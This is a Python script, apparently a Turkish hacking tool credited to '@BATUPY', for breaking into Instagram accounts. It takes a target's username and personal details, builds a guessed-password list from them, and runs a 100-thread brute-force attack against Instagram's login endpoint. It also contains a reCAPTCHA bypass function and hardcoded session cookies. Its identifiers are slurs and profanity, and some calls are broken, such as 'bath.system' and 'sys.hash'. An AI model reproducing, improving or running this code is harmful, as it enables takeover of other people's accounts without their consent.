# @BATUPY
import requests as amk_requests
import itertools as siktir_itertools
import os as batu
import time as yarrak_time
import sys as piç_sys
import re as engel_re
import threading as lanet_threading
import concurrent.futures as salak_concurrent
import shutil as orospu_shutil
from urllib.parse import urlparse as amk_urlparse, urlencode as siktir_urlencode, parse_qs as orospu_parse_qs
class Batuflex:
    def __init__(self):
        self.colors = {
            "amk": "\033[91m",
            "siktir": "\033[92m",
            "yarrak": "\033[93m",
            "piç": "\033[94m",
            "oç": "\033[95m",
            "salak": "\033[96m",
            "orospu": "\033[97m",
            "amcık": "\033[38;5;208m",
            "sürtük": "\033[38;5;135m",
            "kahpe": "\033[38;5;118m",
            "reset": "\033[0m"
        }
    def amk_clear_screen(self):
        if batu.name=='nt':
            bath.system('cls')
        else:
            batu.system('clear')
    def siktir_slow_print(self, metin, delay=0.05):
        renk_keys=[key for key in self.colors if key!="reset"]
        for karakter in metin:
            renk=self.colors[renk_keys[piç_sys.hash(karakter)%len(renk_keys)]]
            piç_sys.stdout.write(f"{renk}{karakter}{self.colors['reset']}")
            piç_sys.stdout.flush()
            yarrak_time.sleep(delay)
        print()
    def amk_recaptcha_bypass(self, anchor_url):
        try:
            amk_basliklar={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'}
            parsed_dik=amk_urlparse(anchor_url)
            sorgu_params=orospu_parse_qs(parsed_dik.query)
            response_dik=amk_requests.get(anchor_url,headers=amk_basliklar)
            token_dik=engel_re.search('value="([^"]+)"',response_dik.text).group(1)
            data_dik={
                'v': sorgu_params['v'][0] if 'v' in sorgu_params and sorgu_params['v'] else '',
                'reason': sorgu_params['q'][0] if 'q' in sorgu_params and sorgu_params['q'] else 'q',
                'c': token_dik,
                'k': sorgu_params['k'][0] if 'k' in sorgu_params and sorgu_params['k'] else '',
                'co': sorgu_params['co'][0] if 'co' in sorgu_params and sorgu_params['co'] else '',
                'hl': 'invisible',
                'size': 'invisible'
            }
            amk_basliklar.update({'Referer':response_dik.url,'Content-Type':'application/x-www-form-urlencoded'})
            reload_url=response_dik.url.replace('anchor','reload')
            response_dik=amk_requests.post(reload_url,headers=amk_basliklar,data=data_dik)
            return engel_re.search(r'\["rresp","([^"]+)"',response_dik.text).group(1)
        except Exception:
            return None
    def piç_login_to_instagram(self, username, password):
        amk_cookies={'ig_did':'9A0A2897-4EC8-4F80-B908-81B6BD843E25','datr':'yOt8Z0u2ryzAjN9lP6J55dnP','ps_l':'1','ps_n':'1','mid':'Z-UsZQAEAAHFVKSYxT8CM2P6h2ah','dpr':'3.0234789848327637','rur':'"LLA,339271932,1778837484:01f7544cdc803f5e889897ed0fa578f1b89b37ffedfabf775450d73113869ae215efdfb0"','csrftoken':'PMjxlnd140gfSimuiJFZBJm7Pd3Lhost','wd':'891x1741'}
        amk_basliklar={'authority':'www.instagram.com','accept':'*/*','accept-language':'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/?flo=true','sec-ch-prefers-color-scheme':'dark','sec-ch-ua':'"Chromium";v="137", "Not/A)Brand";v="24"','sec-ch-ua-full-version-list':'"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"','sec-ch-ua-mobile':'?0','sec-ch-ua-model':'""','sec-ch-ua-platform':'"Linux"','sec-ch-ua-platform-version':'""','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'}
        extra_amk_basliklar={'x-asbd-id':'359341','x-csrftoken':amk_cookies['csrftoken'],'x-ig-app-id':'936619743392459','x-ig-www-claim':'hmac.AR14nfPRDvyE1FOCKmSKY7TGXsQQ2DPtdea1mhy6s5kqrq_5','x-instagram-ajax':'1022863892','x-requested-with':'XMLHttpRequest','x-web-session-id':'mvquj6:qlaq2z:hhta9o'}
        amk_basliklar.update(extra_amk_basliklar)
        data_dik={'enc_password':"#PWD_INSTAGRAM_BROWSER:0:0:" + password,'caaF2DebugGroup':'0','isPrivacyPortalReq':'false','loginAttemptSubmissionCount':'1','optIntoOneTap':'false','queryParams':'{"flo":"true"}','trustedDeviceRecords':'{}','username':username,'jazoest':'22865'}
        try:
            response_dik=amk_requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',cookies=amk_cookies,headers=amk_basliklar,data=data_dik)
            response_dik.raise_for_status()
            result_dik=response_dik.json()
            if result_dik.get('authenticated'):
                return True, "Başarılı"
            else:
                return False, "KÖTÜ"
        except amk_requests.exceptions.RequestException:
            return False, "İstek Hatası"
        except Exception:
            return False, "Bilinmeyen Hata"
    def yarrak_generate_password_list_from_info(self, info_list, save_path):
        amk_special_chars=list("""1234567890@#₺_&-+()/*"' :;!?,.~`|•√π÷×¶∆£€$¢^°={}©®™℅[]<>""")
        try:
            with open(save_path, 'w') as amk_file:
                for amk_info in info_list:
                    for amk_char in amk_special_chars:
                        amk_combos=[f"{amk_info}{amk_char}",f"{amk_char}{amk_info}",f"{amk_info}123",f"123{amk_info}",f"{amk_info}{amk_char}123"]
                        for amk_password in amk_combos:
                            amk_file.write(amk_password+"\n")
                for amk_perm in siktir_itertools.permutations(info_list,2):
                    amk_file.write("".join(amk_perm)+"\n")
            print(f"{self.colors['sürtük']}Tüm kombinasyonlar oluşturuldu ve dosyaya kaydedildi.{self.colors['reset']}")
            batu.system('clear')
        except Exception as amk_e:
            print(f"{self.colors['amk']}Dosya oluşturulurken bir hata oluştu: {amk_e}{self.colors['reset']}")
    def piç_brute_force_instagram_login(self, file_path, username):
        try:
            with open(file_path, 'r') as amk_file:
                amk_passwords=amk_file.readlines()
        except Exception as amk_e:
            print(f"{self.colors['amk']}Dosya okunurken bir hata oluştu: {amk_e}{self.colors['reset']}")
            return
        amk_counters={"failed":0,"successful":0}
        amk_print_lock=lanet_threading.Lock()
        amk_login_success=lanet_threading.Event()
        def amk_attempt_password(amk_password):
            if amk_login_success.is_set():
                return
            amk_pwd=amk_password.strip()
            result,reply=self.piç_login_to_instagram(username,amk_pwd)
            with amk_print_lock:
                if result:
                    amk_counters["successful"]+=1
                    amk_login_success.set()
                else:
                    amk_counters["failed"]+=1
                sik="____________________________________________________________"
                sok=(f"{sik}\n"
                f"\r{self.colors['amk']}BAŞARISIZ: {amk_counters['failed']}{self.colors['reset']} | "
                     f"{self.colors['siktir']}BAŞARILI: {amk_counters['successful']}{self.colors['reset']} | "
                     f"{self.colors['piç']}Ş: {amk_pwd}{self.colors['reset']} | "
                     f"{self.colors['oç']}Y = {reply}{self.colors['reset']}\n\n"
                     f"{sik}")
                print(sok, end="")
            yarrak_time.sleep(0.1)
            batu.system ('clear')
            print(sok, end="")
            
        with salak_concurrent.ThreadPoolExecutor(max_workers=100) as amk_executor:
            amk_futures=[amk_executor.submit(amk_attempt_password,p) for p in amk_passwords]
            salak_concurrent.wait(amk_futures,return_when=salak_concurrent.FIRST_COMPLETED)
            if not amk_login_success.is_set():
                salak_concurrent.wait(amk_futures)
        print()
    def yaramm(self):
        yaram=["⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠶⣄⢀⣠⣤⠴⢦⡀⠀⠀⠀⠀",
"⠀⠀⠀⢠⡿⠉⠉⠉⠛⠶⠶⠖⠒⠒⣾⠋⠀⢀⣀⣙⣯⡁⠀⠀⠀⣿⠀⠀⠀⠀",
"⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⢯⣼⠋⠉⠙⢶⠞⠛⠻⣆⠀⠀⠀",
"⠀⠀⠀⢸⣧⠆⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣤⡤⢿⡀⠀⢀⣼⣷⠀⠀⣽⠀⠀⠀",
"⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢏⡉⠁⣠⡾⣇⠀⠀⠀",
"⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠋⠉⠀⢻⡀⠀⠀",
"⣀⣠⣼⣧⣤⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠐⠖⢻⡟⠓⠒",
"⠀⠀⠈⣷⣀⡀⠀⠘⠿⠇⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠲⣾⠦⢤⠀",
"⠀⠀⠋⠙⣧⣀⡀⠀⠀⠀⠀⠀⠀⠘⠦⠼⠃⠀⠀⠀⠀⠀⠀⠀⢤⣼⣏⠀⠀⠀",
"⠀⠀⢀⠴⠚⠻⢧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠞⠉⠉⠓⠀⠀",
"⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠶⠶⠶⣶⣤⣴⡶⠶⠶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀"]
        color_codes=[self.colors["salak"],self.colors["yarrak"],self.colors["siktir"],self.colors["oç"],self.colors["piç"],self.colors["amcık"],self.colors["sürtük"],self.colors["kahpe"]]
        try:
            terminal_width=orospu_shutil.get_terminal_size().columns
        except Exception:
            terminal_width=80
        for idx,line in enumerate(yaram):
            renk=color_codes[idx%len(color_codes)]
            centered_line=line.strip().center(terminal_width)
            print(f"{renk}{centered_line}{self.colors['reset']}")
    def gaddarısiker(self):
        self.amk_clear_screen()
        self.yaramm()
        print('_-'*30)
        print (f"{self.colors['yarrak']} DEV: @BATUPY{self.colors['reset']}")
        print('_-'*30)
        amk_username=input(f"{self.colors['piç']}Instagram kullanıcı adını girin: {self.colors['reset']}").strip()
        print('-_'*30)
        amk_info_input=input(f"{self.colors['siktir']}Ek bilgiler (boşlukla ayrınız): {self.colors['reset']}").strip()
        batu.system('clear')
        amk_info_list=amk_info_input.split()
        if amk_username not in amk_info_list:
            amk_info_list.append(amk_username)
        amk_save_path="BATU [ŞİFRE LİST].txt"
        self.yarrak_generate_password_list_from_info(amk_info_list, amk_save_path)
        self.piç_brute_force_instagram_login(amk_save_path, amk_username)
if __name__=='__main__':
    Batuflex().gaddarısiker()